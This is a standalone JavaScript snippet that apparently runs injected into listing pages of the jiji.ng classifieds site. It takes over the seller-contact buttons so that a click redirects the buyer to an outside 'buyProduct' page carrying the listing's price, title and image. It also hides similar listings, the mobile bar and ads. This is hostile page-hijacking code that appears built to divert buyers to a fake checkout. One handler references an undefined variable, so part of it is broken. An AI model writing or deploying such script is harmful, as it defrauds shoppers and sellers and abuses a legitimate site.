function run_buy(el){
  el.setAttribute("setattr","true");
let priceEl= document.querySelector("span.qa-advert-price-view-value");
let price = priceEl.getAttribute("content");
  let nameEl = document.querySelector("div.qa-advert-title");
  let name = nameEl.innerText;
  let imageEl = document.querySelector("img.b-slider-image");
  let image = imageEl.src;
  let biz_name = typeof BIZ_NAME == "undefined" ? "": BIZ_NAME;
  location.href = `https://v0-scriptbank.vercel.app/buyProduct?price=${price}&name=${name}&site=jiji.ng&currency=NGN&biz_name=${biz_name}&image=${image}`
  
}
setInterval(function(){
let ads_button = document.querySelector("div.b-advert-contact-buttons");
if(ads_button && ! ads_button.getAttribute("setattr")){
ads_button.addEventListener("click", function(){
 run_buy(add_button);
});
}


let ads_button2 = document.querySelector("div.b-advert-card-wrapper__bottom");

if(ads_button2 && !ads_button2.getAttribute("setattr")){
ads_button2.addEventListener("click", function(){
 run_buy(ads_button2);
});
}

let similar = document.querySelector("div.h-dflex.h-pb-20.h-flex-dir-column");

if(similar && similar.style.display != "none" ){
  similar.style.display = "none";
}

  
let mobile = document.querySelector("div.active.b-mobile-bar.b-mobile-bar-new");

if(mobile && mobile.style.display != "none" ){
  mobile.style.display = "none";
}


let ads = document.querySelector("div.qa-show-adsense");

if(ads && ads.style.display != "none" ){
  ads.style.display = "none";
}

/*
let back = document.querySelector("div.qa-header-back-button");

if(back && back.style.display != "none" ){
  back.style.display = "none";
}
*/
}, 1000);

